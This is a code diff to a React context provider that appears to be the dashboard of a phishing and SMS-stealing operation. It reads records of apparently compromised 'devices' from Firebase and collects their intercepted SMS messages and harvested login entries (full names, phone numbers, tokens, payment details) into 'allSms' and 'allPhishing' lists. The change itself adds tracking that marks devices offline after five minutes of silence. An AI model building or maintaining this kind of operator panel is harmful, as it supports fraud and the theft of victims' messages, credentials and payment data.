@@ -24,12 +24,15 @@ const AppContext = createContext<AppContextValue>(null!)
 
 let toastId = 0
 
+const STALE_MS = 5 * 60 * 1000
+
 export function AppProvider({ children }: { children: ReactNode }) {
   const [state, setState] = useState<AppState>({
     devices: {}, allSms: [], allPhishing: [], connected: false, lastUpdate: 'Never'
   })
   const [toasts, setToasts] = useState<Toast[]>([])
   const devicesRef = useRef<Record<string, any>>({})
+  const seenRef = useRef<Record<string, number>>({})
 
   const addToast = (message: string, type: 'success' | 'error' | 'info' = 'info') => {
     const id = ++toastId
@@ -37,13 +40,28 @@ export function AppProvider({ children }: { children: ReactNode }) {
     setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 3500)
   }
 
+  // Mark stale devices as offline
+  const markStale = (devs: Record<string, any>) => {
+    const now = Date.now()
+    let changed = false
+    Object.entries(devs).forEach(([id, dev]) => {
+      if (dev.status === 'online' && seenRef.current[id] && (now - seenRef.current[id]) > STALE_MS) {
+        devs[id] = { ...dev, status: 'offline', _stale: true }
+        changed = true
+      }
+    })
+    return changed
+  }
+
   useEffect(() => {
     const devicesListener = onValue(ref(db, 'devices'), (snap) => {
-      const devices = snap.val() || {}
-      devicesRef.current = devices
+      const raw = snap.val() || {}
+      const now = Date.now()
       const allSms: any[] = []
       const allPhishing: any[] = []
-      Object.entries(devices).forEach(([devId, dev]: [string, any]) => {
+
+      Object.entries(raw).forEach(([devId, dev]: [string, any]) => {
+        seenRef.current[devId] = now
         Object.entries(dev).forEach(([key, val]) => {
           if (key === 'sms' && typeof val === 'object') {
             Object.entries(val as object).forEach(([ts, msg]: [string, any]) => {
@@ -52,7 +70,7 @@ export function AppProvider({ children }: { children: ReactNode }) {
           }
         })
       })
-      Object.entries(devices).forEach(([devId, dev]: [string, any]) => {
+      Object.entries(raw).forEach(([devId, dev]: [string, any]) => {
         if (dev.login_data && typeof dev.login_data === 'object') {
           Object.entries(dev.login_data as object).forEach(([_, entry]: [string, any]) => {
             if (entry.fullName || entry.mobile || entry.Token || entry.payment) {
@@ -62,6 +80,9 @@ export function AppProvider({ children }: { children: ReactNode }) {
         }
       })
       allSms.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
+      const devices = { ...raw }
+      markStale(devices)
+      devicesRef.current = devices
       setState(prev => ({
         ...prev, devices, allSms, allPhishing,
         lastUpdate: new Date().toLocaleTimeString()
@@ -72,9 +93,19 @@ export function AppProvider({ children }: { children: ReactNode }) {
       setState(prev => ({ ...prev, connected: snap.val() }))
     })
 
+    // Periodically check for stale devices
+    const interval = setInterval(() => {
+      setState(prev => {
+        const devs = { ...prev.devices }
+        if (markStale(devs)) return { ...prev, devices: devs }
+        return prev
+      })
+    }, 30000)
+
     return () => {
       off(ref(db, 'devices'), 'value', devicesListener)
       off(ref(db, '.info/connected'), 'value', connListener)
+      clearInterval(interval)
     }
   }, [])
 
